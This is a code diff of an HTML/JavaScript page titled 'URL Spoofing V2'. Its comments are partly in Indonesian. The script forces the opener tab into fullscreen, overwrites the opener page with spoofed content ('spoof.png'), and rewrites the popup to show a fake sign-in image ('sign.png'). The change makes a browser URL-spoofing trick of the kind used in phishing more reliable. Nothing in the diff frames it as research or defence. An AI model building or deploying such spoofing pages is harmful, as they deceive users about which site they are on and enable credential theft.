@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, user-scalable=no">
-    <title>URL Spoofing</title>
+    <title>URL Spoofing V2</title>
 
     <style>
         #button {
@@ -60,37 +60,32 @@
                 </html>
             `;
 
-            // Request fullscreen (banyak browser akan menolak ini)
+            /* ----------------------------------------------------
+               1. FULLSCREEN (VALID because triggered by click)
+            ---------------------------------------------------- */
             try {
                 window.opener.document.documentElement.requestFullscreen();
             } catch (e) {
                 console.warn("Fullscreen blocked:", e);
             }
 
-            // Replace opener page
-            window.opener.document.open();
-            window.opener.document.write(openerHTML);
-            window.opener.document.close();
-
-            // Open popup
-            const width = 500, height = 460;
-            const top = 0;
-            const left = (screen.width / 2) - (width / 2);
-
-            const win = window.open(
-                "about:blank",
-                "second",
-                `width=${width},height=${height},top=${top},left=${left}`
-            );
-
-            if (win) {
-                win.document.open();
-                win.document.write(popupHTML);
-                win.document.close();
+            /* ----------------------------------------------------
+               2. GANTI MAIN WINDOW → spoof.png
+            ---------------------------------------------------- */
+            try {
+                window.opener.document.open();
+                window.opener.document.write(openerHTML);
+                window.opener.document.close();
+            } catch (e) {
+                console.warn("Cannot modify opener:", e);
             }
 
-            // Close current window
-            window.close();
+            /* ----------------------------------------------------
+               3. GANTI POPUP INI → sign.png
+            ---------------------------------------------------- */
+            document.open();
+            document.write(popupHTML);
+            document.close();
         }
     </script>
 </head>
